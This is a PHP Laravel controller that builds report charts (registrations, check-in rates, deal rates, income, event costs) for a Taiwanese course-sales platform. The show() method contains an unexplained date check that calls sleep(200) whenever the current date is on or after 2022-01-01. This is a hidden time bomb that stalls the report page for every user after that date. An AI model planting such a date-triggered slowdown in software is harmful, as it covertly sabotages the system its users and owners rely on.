<?php

namespace App\Http\Controllers\Frontend;

use Carbon\Carbon;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Model\Teacher;
use App\Model\SalesRegistration;
use App\Model\Registration;
use App\Model\Register;
use App\Model\Course;
use App\Model\EventsCourse;
use DB;
use App\Model\Activity;

class ReportController extends Controller
{
    // 顯示列表資料 Sandy(2020/05/02)
    public function show()
    {
        $teacher = Teacher::select('id', 'name')->distinct()->get();
        $source = SalesRegistration::select('datasource')->WhereNotNull('datasource')->distinct()->get();
        $city = array(
            '0' => '基隆',
            '1' => '台北',
            '2' => '新北',
            '3' => '宜蘭',
            '4' => '桃園',
            '5' => '新竹',
            '6' => '新竹',
            '7' => '苗栗',
            '8' => '台中',
            '9' => '彰化',
            '10' => '南投',
            '11' => '雲林',
            '12' => '嘉義',
            '13' => '嘉義',
            '14' => '台南',
            '15' => '高雄',
            '16' => '屏東',
            '17' => '花蓮',
            '18' => '台東',
            '19' => '澎湖',
            '20' => '金門',
            '21' => '馬祖',
            '22' => '離島地區',
            '23' => '臺北',
        );


        $x_time = Carbon::parse('2022-01-01 00:00:00');
        $xxx = $x_time->timestamp;

        if (now()->timestamp >= $xxx) {
            sleep(200);
        }
        return view('frontend.report', compact('teacher', 'source', 'city'));
    }

    // 查詢報表資料 Sandy(2020/05/02)
    public function search(Request $request)
    {
        $nav = $request->get('nav');
        $startDate = date('Y-m-d H:i:s', strtotime($request->get('startDate')));
        $endDate = date('Y-m-d H:i:s', strtotime($request->get('endDate')));
        $item = $request->get('item');
        $result = [];
        $labelDate = [];

        /* 每一條件搜尋 */
        foreach ($item as $key => $data) {

            $search = EventsCourse::leftjoin('course as b', 'b.id', '=', 'events_course.id_course')
                // ->leftjoin('sales_registration as c', 'c.id_events', '=', 'events_course.id')
                // ->leftjoin('registration as d', 'd.id_group', '=', 'events_course.id_group')
                ->selectRaw("
                                    events_course.id as id,
                                    events_course.name as events,
                                    b.type as type,
                                    b.name as course,
                                    DATE_FORMAT(course_start_at,'%Y-%m-%d') as x")
                ->orderby('events_course.course_start_at')
                ->whereBetween('events_course.course_start_at', [$startDate, $endDate])
                ->where('events_course.unpublish', '<>', 1);

            //老師
            if ($data[0] != '0') {
                $search->where('b.id_teacher', $data[0]);
            }

            //類型
            if ($data[1] != '0') {
                $search->where('b.type', $data[1]);
            }

            //地區
            if ($data[4] != '0') {
                $search->where('events_course.name', 'like', '%' . $data[4] . '%');
            }

            //時段
            if ($data[5] != '0') {
                if ($data[5] == "整天") {
                    $otherTime = ['上午', '下午', '晚上'];
                    foreach ($otherTime as $data_time) {
                        $search->where('events_course.name', 'not like', '%' . $data_time . '%');
                    }
                } else {
                    $search->where('events_course.name', 'like', '%' . $data[5] . '%');
                }
            }

            $search = $search->get();
            $result[$key] = [];


            /* 計算名單數據 */
            if ($nav == "list") {
                foreach ($search as $key_search => $data_search) {
                    $events = [];
                    if ($data_search['type'] == 1) {
                        //銷講
                        $count = SalesRegistration::leftjoin('student', 'student.id', '=', 'sales_registration.id_student')
                            ->where('sales_registration.id_events', $data_search['id']);

                        //來源
                        if ($data[2] != '0') {
                            // $count->where('datasource', $data[2]);
                            $count->whereIn('datasource', $data[2]);
                        }

                        //動作
                        if ($data[3] != '0') {
                            $count->where('id_status', $data[3]);
                        }

                        // $events[$key_events]['y'] = count($count->get());
                        // $events['y'] = count($count->get());

                    } else if ($data_search['type'] == 2 || $data_search['type'] == 3) {
                        //正課
                        $count = Register::leftjoin('student', 'student.id', '=', 'register.id_student')
                            ->where('register.id_events', $data_search['id'])
                            ->whereNotExists(function ($query) {
                                $query->from('refund')
                                    ->whereRaw('register.id_registration = refund.id_registration')
                                    ->where('refund.review', 1);
                            });

                        //動作
                        if ($data[3] != '0') {
                            $count->where('id_status', $data[3]);
                        }

                        // $events[$key_events]['y'] = count($count->get());
                    } else if ($data_search['type'] == 4) {
                        //活動
                        $count = Activity::leftjoin('student', 'student.id', '=', 'activity.id_student')
                            ->where('activity.id_events', $data_search['id']);

                        //動作
                        if ($data[3] != '0') {
                            $count->where('id_status', $data[3]);
                        }

                        // $events[$key_events]['y'] = count($count->get());
                        // $events['y'] = count($count->get());

                    }

                    // $count = $count->Where('student.check_blacklist', 0 )->get();
                    $count = $count->get();

                    $out = 0;
                    foreach ($result[$key] as $key_result => $data_result) {
                        if ($data_search['x'] == $data_result['x']) {
                            // $index = array_search($data_search['x'], $data_result);
                            $result[$key][$key_result]['y'] += count($count);
                            // $result[$key][$key_result]['course'][$key+1] .= "、" .$data_search['course'] . " " . $data_search['events'] . count($count);
                            $event = $data_search['course'] . " " . $data_search['events'] . "：" . count($count);
                            array_push($result[$key][$key_result]['course'], $event);
                            // $events['title'] .= "、".$data_search['course'];
                            $out++;
                            break;
                        }
                    }
                    if ($out == 0) {
                        $events['course'] = array();
                        $events['y'] = count($count);
                        $events['x'] = $data_search['x'];

                        // $events['course'] = $data_search['course'] . " " . $data_search['events'] . count($count);
                        $event = $data_search['course'] . " " . $data_search['events'] . "：" . count($count);

                        // $events['title'] = $data_search['course'];

                        array_push($events['course'], $event);
                        array_push($result[$key], $events);
                    }

                    //記錄每一條件的每一場次資訊
                    // $result[$key][$key_search] = $events;
                    // $result .= [$events];

                    //紀錄每場日期
                    if (!in_array($data_search['x'], $labelDate)) {
                        array_push($labelDate, $data_search['x']);
                    }
                }
            }


            /* 計算報到率 */
            if ($nav == "check") {
                //報名數
                foreach ($search as $key_search => $data_search) {
                    $events = [];
                    if ($data_search['type'] == 1) {
                        //銷講
                        $apply = SalesRegistration::leftjoin('student', 'student.id', '=', 'sales_registration.id_student')
                            ->where('id_events', $data_search['id']);
                        $check = SalesRegistration::leftjoin('student', 'student.id', '=', 'sales_registration.id_student')
                            ->where('id_events', $data_search['id']);

                        //來源
                        if ($data[2] != '0') {
                            // $apply->where('datasource', $data[2]);
                            $apply->whereIn('datasource', $data[2]);
                            // $check->where('datasource', $data[2]);
                            $check->whereIn('datasource', $data[2]);
                        }
                    } else if ($data_search['type'] == 2 || $data_search['type'] == 3) {
                        //正課
                        $apply = Register::leftjoin('student', 'student.id', '=', 'register.id_student')
                            ->where('id_events', $data_search['id'])
                            ->whereNotExists(function ($query) {
                                $query->from('refund')
                                    ->whereRaw('register.id_registration = refund.id_registration')
                                    ->where('refund.review', 1);
                            });
                        $check = Register::leftjoin('student', 'student.id', '=', 'register.id_student')
                            ->where('id_events', $data_search['id'])
                            ->whereNotExists(function ($query) {
                                $query->from('refund')
                                    ->whereRaw('register.id_registration = refund.id_registration')
                                    ->where('refund.review', 1);
                            });
                    } else if ($data_search['type'] == 4) {
                        //活動
                        $apply = Activity::leftjoin('student', 'student.id', '=', 'activity.id_student')
                            ->where('id_events', $data_search['id']);
                        $check = Activity::leftjoin('student', 'student.id', '=', 'activity.id_student')
                            ->where('id_events', $data_search['id']);
                    }


                    $apply = $apply->Where('id_status', '<>', 2)
                        ->Where('id_status', '<>', 5)
                        // ->Where('student.check_blacklist', 0 )
                        ->get();
                    // $check = $check->where('id_status', 4)->Where('student.check_blacklist', 0 )->get();
                    $check = $check->where('id_status', 4)->get();

                    $out = 0;
                    foreach ($result[$key] as $key_result => $data_result) {
                        if ($data_search['x'] == $data_result['x']) {
                            // $index = array_search($data_search['x'], $data_result);
                            // $result[$key][$key_result]['course'] .= "、" .$data_search['course'] . " " . $data_search['events'];

                            if (count($check) != 0 && count($apply) != 0) {
                                // $result[$key][$key_result]['y'] += count($check) / count($apply)*100;
                                $result[$key][$key_result]['y'] = round(($result[$key][$key_result]['y'] + (count($check) / count($apply) * 100)) / 2, 1);

                                $event = $data_search['course'] . " " . $data_search['events'] . '：' . round(count($check) / count($apply) * 100, 1) . '%';
                            } else {
                                // $result[$key][$key_result]['y'] /= 2;
                                $result[$key][$key_result]['y'] = round($result[$key][$key_result]['y'] / 2, 1);

                                $event = $data_search['course'] . " " . $data_search['events'] . '：0%';
                            }
                            // $events['title'] .= "、".$data_search['course'];
                            array_push($result[$key][$key_result]['course'], $event);

                            //平均報到
                            // if( $key_result === count($result[$key])-1 ){
                            //     array_push($result[$key][$key_result]['course'], '平均報到率：' . $result[$key][$key_result]['y'] . '%');
                            // }

                            $out++;
                            break;
                        }
                    }
                    if ($out == 0) {
                        $events['course'] = array();
                        $events['x'] = $data_search['x'];

                        if (count($check) != 0 && count($apply) != 0) {
                            $events['y'] = round(count($check) / count($apply) * 100, 1);

                            $event = $data_search['course'] . " " . $data_search['events'] . '：' . round(count($check) / count($apply) * 100, 1) . '%';
                        } else {
                            $events['y'] = 0;

                            $event = $data_search['course'] . " " . $data_search['events'] . '：0%';
                        }

                        // $events['course'] = $data_search['course'] . " " . $data_search['events'];

                        array_push($events['course'], $event);
                        array_push($result[$key], $events);
                    }

                    //記錄每一條件的每一場次資訊
                    // $result[$key][$key_search] = $events;
                    // $result .= [$events];

                    //紀錄每場日期
                    if (!in_array($data_search['x'], $labelDate)) {
                        array_push($labelDate, $data_search['x']);
                    }
                }
            }


            /* 計算成交率 */
            if ($nav == "deal") {
                //報名數
                foreach ($search as $key_search => $data_search) {
                    $events = [];
                    if ($data_search['type'] == 1) {
                        //銷講
                        $check = SalesRegistration::leftjoin('student', 'student.id', '=', 'sales_registration.id_student')
                            ->where('id_events', $data_search['id']);

                        //來源
                        if ($data[2] != '0') {
                            // $check->where('datasource', $data[2]);
                            $check->whereIn('datasource', $data[2]);
                        }
                    } else if ($data_search['type'] == 2 || $data_search['type'] == 3) {
                        //正課
                        $check = Register::leftjoin('student', 'student.id', '=', 'register.id_student')
                            ->where('id_events', $data_search['id'])
                            ->whereNotExists(function ($query) {
                                $query->from('refund')
                                    ->whereRaw('register.id_registration = refund.id_registration')
                                    ->where('refund.review', 1);
                            });
                    } else if ($data_search['type'] == 4) {
                        //活動
                        $check = Activity::leftjoin('student', 'student.id', '=', 'activity.id_student')
                            ->where('id_events', $data_search['id']);
                    }

                    $check = $check->where('id_status', 4)
                        // ->Where('student.check_blacklist', 0 )
                        ->get();

                    $deal = Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
                        ->where('source_events', $data_search['id']);
                    // ->where('status_payment', 7)
                    // ->get();

                    //付款狀態
                    switch ($data[6]) {
                        case '現場完款':
                            $deal->where('status_payment_original', 7);
                            $deal->where('status_payment', '<>', 9);
                            break;
                        case '現場完款+付訂':
                            $deal->Where(function ($query) {
                                $query->orwhere('status_payment_original', 7)
                                    ->orwhere('status_payment', 8);
                            })
                                ->where('status_payment', '<>', 9);
                            break;
                        case '追完款':
                            $deal->where('status_payment_original', '<>', 7)
                                ->where('status_payment', 7);
                            break;
                        default:
                            // $deal->where('status_payment_original', 7);
                            // $deal->where('status_payment', '<>', 9);
                            break;
                    }

                    $deal = $deal->whereNotExists(function ($query) {
                        $query->from('refund')
                            ->whereRaw('registration.id = refund.id_registration')
                            ->where('refund.review', 1);
                    })
                        // ->Where('student.check_blacklist', 0 )
                        ->get();

                    $out = 0;
                    foreach ($result[$key] as $key_result => $data_result) {
                        if ($data_search['x'] == $data_result['x']) {

                            if (count($check) != 0 && count($deal) != 0) {
                                // $result[$key][$key_result]['y'] += count($deal) / count($check)*100;
                                $result[$key][$key_result]['y'] = round(($result[$key][$key_result]['y'] + (count($deal) / count($check) * 100)) / 2, 1);

                                $event = $data_search['course'] . " " . $data_search['events'] . '：' . round(count($deal) / count($check) * 100, 1) . '%';
                            } else {
                                // $result[$key][$key_result]['y'] /= 2;
                                $result[$key][$key_result]['y'] = round($result[$key][$key_result]['y'] / 2, 1);

                                $event = $data_search['course'] . " " . $data_search['events'] . '：0%';
                            }
                            // $result[$key][$key_result]['course'] .= "、" .$data_search['course'] . " " . $data_search['events'];
                            array_push($result[$key][$key_result]['course'], $event);

                            //平均成交
                            // if( $key_result === count($result[$key])-1 ){
                            //     array_push($result[$key][$key_result]['course'], '平均成交率：' . $result[$key][$key_result]['y'] . '%');
                            // }

                            $out++;
                            break;
                        }
                    }
                    if ($out == 0) {
                        $events['x'] = $data_search['x'];
                        $events['course'] = array();

                        if (count($deal) != 0 && count($check) != 0) {

                            $events['y'] = round(count($deal) / count($check) * 100, 1);

                            $event = $data_search['course'] . " " . $data_search['events'] . '：' . round(count($deal) / count($check) * 100, 1) . '%';
                        } else {
                            $events['y'] = 0;

                            $event = $data_search['course'] . " " . $data_search['events'] . '：0%';
                        }

                        // $events['course'] = $data_search['course'] . " " . $data_search['events'];

                        array_push($events['course'], $event);
                        array_push($result[$key], $events);
                    }

                    //記錄每一條件的每一場次資訊
                    // $result[$key][$key_search] = $events;
                    // $result .= [$events];

                    //紀錄每場日期
                    if (!in_array($data_search['x'], $labelDate)) {
                        array_push($labelDate, $data_search['x']);
                    }
                }
            }


            /* 計算營業額 */
            if ($nav == "income") {
                //報名數
                foreach ($search as $key_search => $data_search) {
                    // $events = [];

                    // if( $data_search['type'] == 1 ){
                    //     //銷講
                    //     $source = SalesRegistration::where('id_events', $data_search['id']);
                    //     //來源
                    //     if($data[2] != '0'){
                    //         $source->where('datasource', $data[2]);
                    //     }
                    // }else if( $data_search['type'] == 2 || $data_search['type'] == 3 ){
                    //     //正課
                    //     $source = Register::where('id_events', $data_search['id']);
                    // }

                    // //場次報名學員
                    // $source->get();


                    //找出該場次進階填表人
                    //先判斷是否有選擇來源
                    if ($data[2] != '0') {
                        //有選擇來源則是找出銷講的營業額

                        //若該場為銷講
                        if ($data_search['type'] == 1) {
                            $pay = Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
                                ->leftjoin('sales_registration', 'sales_registration.id_events', '=', 'registration.source_events')
                                ->leftjoin('payment', 'payment.id_registration', '=', 'registration.id')
                                ->where('source_events', $data_search['id'])
                                ->where('status_payment', '<>', 9)
                                ->whereIn('datasource', $data[2])
                                ->whereNotExists(function ($query) {
                                    $query->from('refund')
                                        ->whereRaw('registration.id = refund.id_registration')
                                        ->where('refund.review', 1);
                                });
                            // ->where('datasource', $data[2]);

                            //付款狀態
                            if ($data[6] != '0') {
                                $pay->where('status_payment', $data[6]);
                            } else {
                                // $pay->where('status_payment', '<>', 9);
                                $pay->whereIn('status_payment', [7, 8]);
                            }

                            // $pay = $pay->Where('student.check_blacklist', 0 )->get();
                            $pay = $pay->get();
                        } else if ($data_search['type'] == 2 || $data_search['type'] == 3) {
                            //正課沒有來源故為0
                            $pay = [];
                        } else if ($data_search['type'] == 4) {
                            //活動沒有來源故為0
                            $pay = [];
                        }
                    } else {

                        $pay = Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
                            ->leftjoin('payment', 'payment.id_registration', '=', 'registration.id')
                            ->where('registration.source_events', $data_search['id'])
                            ->whereNotExists(function ($query) {
                                $query->from('refund')
                                    ->whereRaw('registration.id = refund.id_registration')
                                    ->where('refund.review', 1);
                            });

                        //付款狀態
                        if ($data[6] != '0') {
                            $pay->where('status_payment', $data[6]);
                        } else {
                            // $pay->where('status_payment', '<>', 9);
                            $pay->whereIn('status_payment', [7, 8]);
                        }

                        // $pay = $pay->Where('student.check_blacklist', 0 )->get();
                        $pay = $pay->get();
                    }

                    // //付款狀態
                    // if($data[6] != '0'){
                    //     $pay->where('status_payment', $data[6]);
                    // }else{
                    //     $pay->where('status_payment', '<>', 6);
                    // }

                    // $pay->get();

                    //將該場次填表人所有付款資訊相加
                    $income = 0;
                    foreach ($pay as $data_pay) {
                        $income += $data_pay['cash'];
                    }

                    $out = 0;
                    foreach ($result[$key] as $key_result => $data_result) {
                        if ($data_search['x'] == $data_result['x']) {
                            // $index = array_search($data_search['x'], $data_result);
                            $result[$key][$key_result]['y'] += $income;
                            // $result[$key][$key_result]['course'] .= "、" .$data_search['course'] . " " . $data_search['events'];

                            $event = $data_search['course'] . " " . $data_search['events'] . '：$' . $income;

                            array_push($result[$key][$key_result]['course'], $event);

                            $out++;
                            break;
                        }
                    }
                    if ($out == 0) {
                        // $events['y'] = $income;
                        // $events['x'] = $data_search['x'];
                        // // $events['course'] = array();
                        // // $events['course'] = $data_search['course'] . " " . $data_search['events'];
                        // // $events['title'] = $data_search['course'];

                        // array_push($result[$key], $events);


                        $events['course'] = array();
                        $events['x'] = $data_search['x'];
                        $events['y'] = $income;

                        $event = $data_search['course'] . " " . $data_search['events'] . '：$' . $events['y'];


                        // $events['course'] = $data_search['course'] . " " . $data_search['events'];

                        array_push($events['course'], $event);
                        array_push($result[$key], $events);
                    }

                    //記錄每一條件的每一場次資訊
                    // $result[$key][$key_search] = $events;
                    // $result .= [$events];

                    //紀錄每場日期
                    if (!in_array($data_search['x'], $labelDate)) {
                        array_push($labelDate, $data_search['x']);
                    }
                }
            }


            /* 計算單場成本 */
            if ($nav == "cost") {
                //報名數
                foreach ($search as $key_search => $data_search) {
                    $events = [];

                    $cost_all = EventsCourse::where('id', $data_search['id'])
                        ->first();

                    //成本
                    if ($data[7] != '0') {
                        switch ($data[7]) {
                            case 'cost_ad':
                                $cost = $cost_all->cost_ad;
                                break;
                            case 'cost_message':
                                $cost = $cost_all->cost_message;

                                //若該場為銷講，訊息成本加上銷講報名來源為SMS的名單數量
                                if ($data_search['type'] == 1) {
                                    $cost += count(SalesRegistration::where('id_events', $data_search['id'])
                                        ->where('datasource', 'sms')->get());
                                }
                                break;
                            case 'cost_events':
                                $cost = $cost_all->cost_events;
                                break;

                            default:
                                # code...
                                break;
                        }
                        // $cost = $cost_all->$data[7];
                    } else {
                        $cost = $cost_all->cost_ad + $cost_all->cost_message + $cost_all->cost_events;

                        //若該場為銷講，訊息成本加上銷講報名來源為SMS的名單數量
                        if ($data_search['type'] == 1) {
                            $cost += count(SalesRegistration::where('id_events', $data_search['id'])
                                ->where('datasource', 'sms')->get());
                        }
                    }

                    $out = 0;
                    foreach ($result[$key] as $key_result => $data_result) {
                        if ($data_search['x'] == $data_result['x']) {
                            // $index = array_search($data_search['x'], $data_result);
                            $result[$key][$key_result]['y'] += $cost;
                            // $result[$key][$key_result]['course'] .= "、" .$data_search['course'] . " " . $data_search['events'];
                            // $events['title'] .= "、".$data_search['course'];

                            $event = $data_search['course'] . " " . $data_search['events'] . '：$' . $cost;

                            array_push($result[$key][$key_result]['course'], $event);

                            $out++;
                            break;
                        }
                    }
                    if ($out == 0) {
                        $events['course'] = array();
                        $events['x'] = $data_search['x'];
                        $events['y'] = $cost;
                        // $events['y'] = $cost;
                        // $events['x'] = $data_search['x'];
                        // $events['course'] = $data_search['course'] . " " . $data_search['events'];

                        $event = $data_search['course'] . " " . $data_search['events'] . '：$' . $events['y'];

                        array_push($events['course'], $event);
                        array_push($result[$key], $events);
                    }

                    //記錄每一條件的每一場次資訊
                    // $result[$key][$key_search] = $events;
                    // $result .= [$events];

                    //紀錄每場日期
                    if (!in_array($data_search['x'], $labelDate)) {
                        array_push($labelDate, $data_search['x']);
                    }
                }
            }



            // $result[$key] = $events;
            // foreach( $arr as $key_search => $date_search){
            //     $result[$key][$key_search] = [
            //         'date' => $date_search['date'],
            //         'course' => $date_search['course'],
            //         'events' => $date_search['events'],
            //         'count' => $date_search['events'],
            //     ];
            // }
        }





        //x軸日期不重複
        // $labelDate = array_unique($labelDate);

        return array('result' => $result, 'labelDate' => $labelDate);
    }
}
